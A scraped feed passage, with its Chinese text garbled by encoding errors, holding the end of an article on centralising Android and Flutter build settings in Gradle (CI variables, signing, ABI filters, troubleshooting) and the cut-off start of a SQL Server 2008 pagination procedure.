    appVersion  : "1.15.001",  // æ›´æ–°ç‰ˆæœ¬å·
]
</code></pre>
<p>æ„å»ºæ­¥éª¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">flutter clean
flutter build apk --release
</code></pre>
<h3 data-id="heading-19">æ–¹æ³•2ï¼šç¯å¢ƒå˜é‡é…ç½®ï¼ˆæ¨èï¼‰</h3>
<p>é€‚ç”¨äº CI/CD æµæ°´çº¿ï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">def releaseConfig = [
    buildModel  : System.getenv("BUILD_MODEL") ?: "modelA",
    appVersion  : System.getenv("APP_VERSION") ?: "1.14.005",
]
</code></pre>
<p><strong>CI/CD é…ç½®ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># GitLab CI</span>
<span class="hljs-attr">build_modelA:</span>
  <span class="hljs-attr">script:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">export</span> <span class="hljs-string">BUILD_MODEL=modelA</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">export</span> <span class="hljs-string">APP_VERSION=1.14.005</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">flutter</span> <span class="hljs-string">build</span> <span class="hljs-string">apk</span> <span class="hljs-string">--release</span>

<span class="hljs-attr">build_modelB:</span>
  <span class="hljs-attr">script:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">export</span> <span class="hljs-string">BUILD_MODEL=modelB</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">export</span> <span class="hljs-string">APP_VERSION=1.15.001</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">flutter</span> <span class="hljs-string">build</span> <span class="hljs-string">apk</span> <span class="hljs-string">--release</span>
</code></pre>
<pre><code class="hljs language-groovy" lang="groovy">// Jenkins Pipeline
pipeline {
    environment {
        BUILD_MODEL = 'modelA'
        APP_VERSION = '1.14.005'
    }
    stages {
        stage('Build') {
            steps {
                sh 'flutter build apk --release'
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-20">æ–¹æ³•3ï¼šGradle å±æ€§é…ç½®</h3>
<p>é€šè¿‡ <code>gradle.properties</code> æˆ–å‘½ä»¤è¡Œå‚æ•°ï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">def releaseConfig = [
    buildModel  : project.hasProperty('buildModel') 
        ? project.property('buildModel') 
        : "modelA",
    appVersion  : project.hasProperty('appVersion') 
        ? project.property('appVersion') 
        : "1.14.005",
]
</code></pre>
<p><strong>å‘½ä»¤è¡Œä½¿ç”¨</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">./gradlew assembleRelease -PbuildModel=modelB -PappVersion=1.15.001
</code></pre>
<hr/>
<h2 data-id="heading-21">æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-22">1. ç‰ˆæœ¬å·è§„èŒƒ</h3>
<p>é‡‡ç”¨è¯­ä¹‰åŒ–ç‰ˆæœ¬å·ç®¡ç†ï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">// æ ¼å¼: ä¸»ç‰ˆæœ¬.æ¬¡ç‰ˆæœ¬.ä¿®è®¢å·
appVersion: "1.14.005"  // ä¸»ç‰ˆæœ¬1ï¼Œæ¬¡ç‰ˆæœ¬14ï¼Œä¿®è®¢å·5
</code></pre>
<h3 data-id="heading-23">2. é…ç½®éªŒè¯</h3>
<p>åœ¨æ„å»ºå‰éªŒè¯é…ç½®æœ‰æ•ˆæ€§ï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">def releaseConfig = [
    buildModel  : "modelA",
    appVersion  : "1.14.005",
]

// éªŒè¯é…ç½®
if (!["modelA", "modelB"].contains(releaseConfig["buildModel"])) {
    throw new GradleException("Invalid buildModel: ${releaseConfig['buildModel']}")
}

if (!releaseConfig["appVersion"].matches(/\d+\.\d+\.\d+/)) {
    throw new GradleException("Invalid version format: ${releaseConfig['appVersion']}")
}
</code></pre>
<h3 data-id="heading-24">3. é…ç½®æ—¥å¿—è¾“å‡º</h3>
<p>åœ¨æ„å»ºæ—¶è¾“å‡ºå½“å‰é…ç½®ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">task printBuildConfig {
    doLast {
        println "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
        println "Build Configuration:"
        println "  Build Model:    ${releaseConfig['buildModel']}"
        println "  App Version:    ${releaseConfig['appVersion']}"
        println "  App Name:       ${releaseConfig['appName']}"
        println "  System Sign:    ${releaseConfig['useSystemSign']}"
        println "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
    }
}

tasks.whenTaskAdded { task -&gt;
    if (task.name == 'assembleRelease' || task.name == 'assembleDebug') {
        task.dependsOn printBuildConfig
    }
}
</code></pre>
<h3 data-id="heading-25">4. æ•æ„Ÿä¿¡æ¯ä¿æŠ¤</h3>
<p>å¯†é’¥æ–‡ä»¶è·¯å¾„å’Œå¯†ç åº”é€šè¿‡ç¯å¢ƒå˜é‡æ³¨å…¥ï¼š</p>
<pre><code class="hljs language-groovy" lang="groovy">signingConfigs {
    systemSign {
        storeFile file(System.getenv("KEYSTORE_PATH") ?: "../keys/platform.jks")
        storePassword System.getenv("KEYSTORE_PASSWORD")
        keyAlias System.getenv("KEY_ALIAS")
        keyPassword System.getenv("KEY_PASSWORD")
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-26">æ•…éšœæ’æŸ¥</h2>
<h3 data-id="heading-27">é—®é¢˜1ï¼šåº”ç”¨å®‰è£…å¤±è´¥ï¼ˆINSTALL_FAILED_SHARED_USER_INCOMPATIBLEï¼‰</h3>
<p><strong>ç—‡çŠ¶</strong>ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">Failure [INSTALL_FAILED_SHARED_USER_INCOMPATIBLE: Scanning Failed.: 
Package has a signing certificate <span class="hljs-keyword">not</span> signed <span class="hljs-keyword">with</span> same certificate <span class="hljs-keyword">as</span> sharedUserId]
</code></pre>
<p><strong>åŸå› </strong>ï¼šåº”ç”¨ç­¾åä¸ <code>sharedUserId</code> è¦æ±‚ä¸åŒ¹é…</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ol>
<li>ç¡®è®¤ä½¿ç”¨ç³»ç»Ÿç­¾åæ—¶ <code>useSystemSign = true</code></li>
<li>éªŒè¯ç­¾åæ–‡ä»¶ä¸ç³»ç»Ÿå›ºä»¶ç­¾åä¸€è‡´</li>
<li>å¸è½½æ—§ç‰ˆæœ¬åé‡æ–°å®‰è£…</li>
</ol>
<h3 data-id="heading-28">é—®é¢˜2ï¼šBuildConfig å­—æ®µæ— æ³•è®¿é—®</h3>
<p><strong>ç—‡çŠ¶</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java">error: cannot find symbol
symbol:   variable buildModel
location: <span class="hljs-keyword">class</span> <span class="hljs-title class_">BuildConfig</span>
</code></pre>
<p><strong>åŸå› </strong>ï¼šæœªæ‰§è¡Œ Gradle åŒæ­¥æˆ–é…ç½®æœªç”Ÿæ•ˆ</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Android Studio: ç‚¹å‡» "Sync Project with Gradle Files"</span>
<span class="hljs-comment"># æˆ–å‘½ä»¤è¡Œæ‰§è¡Œï¼š</span>
./gradlew clean
./gradlew assembleDebug
</code></pre>
<h3 data-id="heading-29">é—®é¢˜3ï¼šNative åº“åŠ è½½å¤±è´¥ï¼ˆUnsatisfiedLinkErrorï¼‰</h3>
<p><strong>ç—‡çŠ¶</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">java.lang.UnsatisfiedLinkError: dlopen failed: 
<span class="hljs-string">"/data/app/.../lib/arm/libnative.so"</span> is <span class="hljs-number">32</span>-bit instead of <span class="hljs-number">64</span>-bit
</code></pre>
<p><strong>åŸå› </strong>ï¼šABI æ¶æ„ä¸è®¾å¤‡ä¸åŒ¹é…</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ol>
<li>æ£€æŸ¥è®¾å¤‡æ¶æ„ï¼š<code>adb shell getprop ro.product.cpu.abi</code></li>
<li>æ ¹æ®è®¾å¤‡æ¶æ„è°ƒæ•´é…ç½®æˆ–æ‰“åŒ…å¤šæ¶æ„ï¼š
<pre><code class="hljs language-groovy" lang="groovy">ndk {
    abiFilters "arm64-v8a", "armeabi-v7a"
}
</code></pre>
</li>
</ol>
<hr/>
<h2 data-id="heading-30">é…ç½®å½±å“æ£€æŸ¥æ¸…å•</h2>
<p>åˆ‡æ¢ <code>buildModel</code> æ—¶ï¼Œä»¥ä¸‹å†…å®¹ä¼šè‡ªåŠ¨æ”¹å˜ï¼š</p>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> <strong>BuildConfig å¸¸é‡</strong> - Java/Kotlin ä»£ç ä¸­çš„ <code>BuildConfig.buildModel</code> å€¼</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> <strong>Manifest å ä½ç¬¦</strong> - <code>android:sharedUserId</code> ç­‰åŠ¨æ€å±æ€§</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> <strong>ç­¾åé…ç½®</strong> - ä½¿ç”¨ç³»ç»Ÿç­¾åæˆ–æ™®é€šç­¾å</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> <strong>ABI æ¶æ„</strong> - arm64-v8a æˆ– armeabi-v7a</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> <strong>APK æ–‡ä»¶å</strong> - äº§å“åç§°å’Œç‰ˆæœ¬å·</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> <strong>åº”ç”¨æƒé™çº§åˆ«</strong> - ç³»ç»Ÿçº§æˆ–æ™®é€šåº”ç”¨çº§</li>
</ul>
<hr/>
<h2 data-id="heading-31">æ¶æ„ä¼˜åŠ¿</h2>
<h3 data-id="heading-32">1. å•ç‚¹é…ç½®</h3>
<p>åªéœ€ä¿®æ”¹é¡¶éƒ¨é…ç½®å¯¹è±¡ï¼Œæ‰€æœ‰ç›¸å…³æ„å»ºè¡Œä¸ºè‡ªåŠ¨è”åŠ¨æ›´æ–°</p>
<h3 data-id="heading-33">2. ç±»å‹å®‰å…¨</h3>
<p>é€šè¿‡ BuildConfig æ³¨å…¥ï¼Œé¿å…ç¡¬ç¼–ç å­—ç¬¦ä¸²ï¼Œå‡å°‘è¿è¡Œæ—¶é”™è¯¯</p>
<h3 data-id="heading-34">3. è·¨å¹³å°å…±äº«</h3>
<p>Android åŸç”Ÿä»£ç å’Œ Flutter ä»£ç ä½¿ç”¨åŒä¸€é…ç½®æº</p>
<h3 data-id="heading-35">4. è‡ªåŠ¨åŒ–å‹å¥½</h3>
<p>æ˜“äºé›†æˆåˆ° CI/CD æµæ°´çº¿ï¼Œæ”¯æŒç¯å¢ƒå˜é‡å’Œ Gradle å±æ€§æ³¨å…¥</p>
<h3 data-id="heading-36">5. å¯æ‰©å±•æ€§</h3>
<p>å¯è½»æ¾æ·»åŠ æ–°çš„é…ç½®å‚æ•°å’Œæ´¾ç”Ÿå±æ€§</p>
<hr/>
<h2 data-id="heading-37">é…ç½®ä¾èµ–å…³ç³»å›¾</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[releaseConfig é…ç½®å¯¹è±¡] --&gt; B[BuildConfig å­—æ®µæ³¨å…¥]
    A --&gt; C[Manifest å ä½ç¬¦]
    A --&gt; D[ç­¾åé…ç½®é€‰æ‹©]
    A --&gt; E[ABI æ¶æ„è¿‡æ»¤]
    A --&gt; F[è¾“å‡ºæ–‡ä»¶å‘½å]
    
    B --&gt; G[Android åŸç”Ÿä»£ç ]
    B --&gt; H[Flutter Dart ä»£ç ]
    
    C --&gt; I[AndroidManifest.xml&lt;br/&gt;åŠ¨æ€å±æ€§]
    
    D --&gt; J[APK ç­¾å]
    J --&gt; K{ç­¾åéªŒè¯}
    K --&gt;|ç³»ç»Ÿç­¾å| L[ç³»ç»Ÿåº”ç”¨æƒé™]
    K --&gt;|æ™®é€šç­¾å| M[æ™®é€šåº”ç”¨æƒé™]
    
    E --&gt; N[Native åº“æ¶æ„]
    F --&gt; O[APK æ–‡ä»¶è¾“å‡º]
    
    style A fill:#e1f5ff
    style B fill:#fff3cd
    style I fill:#d4edda
    style J fill:#d1ecf1
</code></pre>
<hr/>
<h2 data-id="heading-38">å®Œæ•´é…ç½®ç¤ºä¾‹</h2>
<pre><code class="hljs language-groovy" lang="groovy">// ===== æ ¸å¿ƒé…ç½®å®šä¹‰ =====
def releaseConfig = [
    buildModel  : System.getenv("BUILD_MODEL") ?: "modelA",
    appVersion  : System.getenv("APP_VERSION") ?: "1.14.005",
]

// ===== æ´¾ç”Ÿé…ç½® =====
releaseConfig["useSystemSign"] = (releaseConfig["buildModel"] == "modelA")
releaseConfig["appName"]       = (releaseConfig["buildModel"] == "modelA" 
    ? "AppVariantA" 
    : "AppVariantB")

// ===== é…ç½®éªŒè¯ =====
if (!["modelA", "modelB"].contains(releaseConfig["buildModel"])) {
    throw new GradleException("Invalid buildModel: ${releaseConfig['buildModel']}")
}

android {
    namespace = "com.example.myapp"
    compileSdk = 34

    // ===== BuildConfig æ³¨å…¥ =====
    defaultConfig {
        buildConfigField("String", "buildModel",  "\"${releaseConfig['buildModel']}\"")
        buildConfigField("String", "appName",     "\"${releaseConfig['appName']}\"")
        buildConfigField("String", "appVersion",  "\"${releaseConfig['appVersion']}\"")

        // ===== Manifest å ä½ç¬¦ =====
        manifestPlaceholders = [
            sharedUserId: releaseConfig["useSystemSign"] ? "android.uid.system" : ""
        ]

        // ===== ABI è¿‡æ»¤ =====
        ndk {
            abiFilters (releaseConfig["useSystemSign"] ? "arm64-v8a" : "armeabi-v7a")
        }
    }

    // ===== ç­¾åé…ç½® =====
    signingConfigs {
        systemSign {
            storeFile file("../keys/platform.jks")
            storePassword System.getenv("SYSTEM_KEYSTORE_PASSWORD")
            keyAlias "platform"
            keyPassword System.getenv("SYSTEM_KEY_PASSWORD")
        }

        normalSign {
            storeFile file("../keys/release.jks")
            storePassword System.getenv("RELEASE_KEYSTORE_PASSWORD")
            keyAlias "release"
            keyPassword System.getenv("RELEASE_KEY_PASSWORD")
        }
    }

    buildTypes {
        release {
            signingConfig (releaseConfig["useSystemSign"] 
                ? signingConfigs.systemSign 
                : signingConfigs.normalSign)
            minifyEnabled true
            shrinkResources true
        }
        debug {
            signingConfig (releaseConfig["useSystemSign"] 
                ? signingConfigs.systemSign 
                : signingConfigs.normalSign)
        }
    }

    // ===== è¾“å‡ºæ–‡ä»¶å‘½å =====
    applicationVariants.all { variant -&gt;
        variant.outputs.all {
            outputFileName = "${releaseConfig['appName']}.${releaseConfig['appVersion']}.apk"
        }
    }
}

// ===== æ„å»ºä¿¡æ¯è¾“å‡º =====
task printBuildConfig {
    doLast {
        println "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
        println "Build Configuration:"
        println "  Build Model:    ${releaseConfig['buildModel']}"
        println "  App Version:    ${releaseConfig['appVersion']}"
        println "  App Name:       ${releaseConfig['appName']}"
        println "  System Sign:    ${releaseConfig['useSystemSign']}"
        println "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
    }
}

tasks.whenTaskAdded { task -&gt;
    if (task.name.contains('assemble')) {
        task.dependsOn printBuildConfig
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-39">æ€»ç»“</h2>
<p>æœ¬æ–‡ä»‹ç»çš„ç»Ÿä¸€é…ç½®æ–¹æ¡ˆé€šè¿‡åœ¨ <a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">build.gradle</a> ä¸­å®šä¹‰é…ç½®å¯¹è±¡ï¼Œå®ç°äº†å¯¹ Android å’Œ Flutter åŒç«¯æ„å»ºè¡Œä¸ºçš„é›†ä¸­å¼ç®¡ç†ã€‚è¯¥æ–¹æ¡ˆå…·æœ‰ä»¥ä¸‹æ ¸å¿ƒä»·å€¼ï¼š</p>
<p>âœ… <strong>ç®€åŒ–é…ç½®ç®¡ç†</strong> - å•ç‚¹é…ç½®ï¼Œè‡ªåŠ¨è”åŠ¨<br/>
âœ… <strong>æé«˜ä»£ç è´¨é‡</strong> - ç±»å‹å®‰å…¨ï¼Œå‡å°‘ç¡¬ç¼–ç <br/>
âœ… <strong>å¢å¼ºå¯ç»´æŠ¤æ€§</strong> - é…ç½®é›†ä¸­ï¼Œæ˜“äºç†è§£å’Œä¿®æ”¹<br/>
âœ… <strong>æ”¯æŒè‡ªåŠ¨åŒ–</strong> - æ˜“äºé›†æˆ CI/CD æµæ°´çº¿<br/>
âœ… <strong>æå‡å¼€å‘æ•ˆç‡</strong> - å¿«é€Ÿåˆ‡æ¢äº§å“å˜ä½“å’Œæ„å»ºæ¨¡å¼</p>
<p>è¯¥æ–¹æ¡ˆç‰¹åˆ«é€‚åˆä»¥ä¸‹åœºæ™¯ï¼š</p>
<ul>
<li>éœ€è¦ç®¡ç†å¤šä¸ªç¡¬ä»¶å¹³å°æˆ–äº§å“SKUçš„é¡¹ç›®</li>
<li>éœ€è¦åŒºåˆ†ç³»ç»Ÿåº”ç”¨å’Œæ™®é€šåº”ç”¨çš„é¡¹ç›®</li>
<li>éœ€è¦æ ¹æ®ç›®æ ‡è®¾å¤‡åŠ¨æ€è°ƒæ•´æ„å»ºå‚æ•°çš„é¡¹ç›®</li>
<li>éœ€è¦åœ¨ Android å’Œ Flutter ä¹‹é—´å…±äº«é…ç½®çš„æ··åˆå¼€å‘é¡¹ç›®</li>
</ul>
<hr/>
<p><strong>æ–‡æ¡£ç‰ˆæœ¬</strong>ï¼š1.0<br/>
<strong>é€‚ç”¨èŒƒå›´</strong>ï¼šAndroid Gradle Plugin 7.0+, Flutter 2.0+<br/>
<strong>æœ€åæ›´æ–°</strong>ï¼š2026-02-09</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[sql2008 æ•°æ®åº“åˆ†é¡µè¯­å¥]]></title>    <link>https://juejin.cn/post/7604507125858041883</link>    <guid>https://juejin.cn/post/7604507125858041883</guid>    <pubDate>2026-02-09T10:01:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604507125858041883" data-draft-id="7604690250362912777" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="sql2008 æ•°æ®åº“åˆ†é¡µè¯­å¥"/> <meta itemprop="keywords" content="æ•°æ®åº“"/> <meta itemprop="datePublished" content="2026-02-09T10:01:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§å·¨å¤´"/> <meta itemprop="url" content="https://juejin.cn/user/3993841710667752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            sql2008 æ•°æ®åº“åˆ†é¡µè¯­å¥
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3993841710667752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§å·¨å¤´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T10:01:49.000Z" title="Mon Feb 09 2026 10:01:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">PROCEDURE</span> Proc_GetBillPage
    <span class="hljs-variable">@PageIndex</span> <span class="hljs-type">INT</span>,
    <span class="hljs-variable">@PageSize</span> <span class="hljs-type">INT</span>
<span class="hljs-keyword">AS</span>
<span class="hljs-keyword">BEGIN</span>
    <span class="hljs-keyword">SET</span> NOCOUNT <span class="hljs-keyword">ON</span>;
    
    <span class="hljs-keyword">SELECT</span> 
        Id, è´¦å•å·, é‡‘é¢, äº¤æ˜“æ—¶é—´, TotalCount
    <span class="hljs-keyword">FROM</span> (
        <span class="hljs-keyword">SELECT</span> 
            <span class="hljs-built_in">ROW_NUMBER</span>() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> Id <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> RowNum,
            <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">OVER</span>() <span class="hljs-keyword">AS</span> TotalCount,
            Id, è´¦å•å·, é‡‘é¢, äº¤æ˜“æ—¶é—´
        <span class="hljs-keyword">FROM</span> è´¦å•è¡¨
        <span class="hljs-keyword">WHERE</span> çŠ¶æ€ <span class="hljs-operator">=</span> <span class="hljs-string">'æœ‰æ•ˆ'</span>
    ) <span class="hljs-keyword">AS</span> TempTable
    <span class="hljs-keyword">WHERE</span> RowNum <span class="hljs-keyword">BETWEEN</span> (<span class="hljs-variable">@PageIndex</span> <span class="hljs-operator">-</span> <span class="hljs-number">1</span>) <span class="hljs-operator">*</span> <span class="hljs-variable">@PageSize</span> <span class="hljs-operator">+</span> <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-variable">@PageIndex</span> <span class="hljs-operator">*</span> <span class="hljs-variable">@PageSize</span>;
<span class="hljs-keyword">END</span>;
GO

<span class="hljs-comment">-- è°ƒç”¨å­˜å‚¨è¿‡ç¨‹</span>
<span class="hljs-keyword">EXEC</span> Proc_GetBillPage <span class="hljs-variable">@PageIndex</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>, <span class="hljs-variable">@PageSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
</code></pre>
<h3 data-id="heading-0">å¸¦æ€»æ¡æ•°çš„åˆ†é¡µï¼ˆå‰ç«¯åˆ†é¡µéœ€æ€»é¡µæ•°ï¼‰</h3>
<p>å®é™…å¼€å‘ä¸­é€šå¸¸éœ€è¦è¿”å›ã€Œå½“å‰é¡µæ•°æ® + æ€»æ¡æ•°ã€ï¼Œå¯é€šè¿‡ <code>COUNT(*) OVER()</code> å®ç°ï¼ˆæ— éœ€é¢å¤–æŸ¥è¯¢ï¼‰ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DECLARE</span> <span class="hljs-variable">@PageIndex</span> <span class="hljs-type">INT</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;
<span class="hljs-keyword">DECLARE</span> <span class="hljs-variable">@PageSize</span> <span class="hljs-type">INT</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;

<span class="hljs-keyword">SELECT</span> 
    <span class="hljs-comment">-- åˆ†é¡µæ•°æ®</span>
    Id, è´¦å•å·, é‡‘é¢, äº¤æ˜“æ—¶é—´,
    <span class="hljs-comment">-- æ€»æ¡æ•°ï¼ˆæ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„è®°å½•æ•°ï¼Œæ•´é¡µæ•°æ®ä¸­è¯¥å€¼ç›¸åŒï¼‰</span>
    TotalCount
<span class="hljs-keyword">FROM</span> (
    <span class="hljs-keyword">SELECT</span> 
